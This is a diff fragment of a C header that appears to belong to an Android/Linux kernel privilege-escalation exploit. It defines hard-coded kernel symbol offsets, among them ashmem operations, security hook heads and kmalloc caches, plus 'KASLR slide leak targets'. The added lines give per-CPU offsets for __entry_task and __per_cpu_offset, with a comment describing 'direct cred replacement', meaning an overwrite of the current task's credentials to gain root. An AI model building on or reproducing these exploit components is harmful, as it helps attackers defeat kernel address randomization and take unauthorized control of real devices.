@@ -81,6 +81,14 @@
 #define KMALLOC_CACHES_OFF           0x000000000164ef50ULL  /* symbol: kmalloc_caches */
 #define ANON_PIPE_BUF_OPS_OFF        0x000000000114a288ULL  /* symbol: anon_pipe_buf_ops */
 
+/* Per-CPU symbols for direct cred replacement (Linuxoid-cn approach)
+ * __per_cpu_start = 0x08896000 (compile-time per-CPU section base)
+ * __entry_task    = 0x08896328 (per-CPU current task pointer, 8 bytes)
+ * __per_cpu_offset= 0x00acb658 (.data section, runtime per-CPU delta)
+ * Runtime task = *(data_addr(ENTRY_TASK) + per_cpu_delta) */
+#define ENTRY_TASK_OFF               0x0000000008896328ULL  /* symbol: __entry_task */
+#define PER_CPU_OFFSET_OFF           0x0000000000acb658ULL  /* symbol: __per_cpu_offset */
+
 #define ASHMEM_MISC (KIMAGE_TEXT_BASE + ASHMEM_MISC_OFF)
 #define ASHMEM_MISC_FOPS (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
 #define ASHMEM_FOPS (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
@@ -106,6 +114,8 @@
 #define SECURITY_HOOK_HEADS (KIMAGE_TEXT_BASE + SECURITY_HOOK_HEADS_OFF)
 #define KMALLOC_CACHES (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
 #define ANON_PIPE_BUF_OPS (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
+#define ENTRY_TASK (KIMAGE_TEXT_BASE + ENTRY_TASK_OFF)
+#define PER_CPU_OFFSET (KIMAGE_TEXT_BASE + PER_CPU_OFFSET_OFF)
 
 /* KASLR slide leak targets (from kallsyms 2026-07-10) */
 #define SLIDE_NFULNL_LOGGER_OFF      0x00000000020d2270ULL  /* symbol: nfulnl_logger */
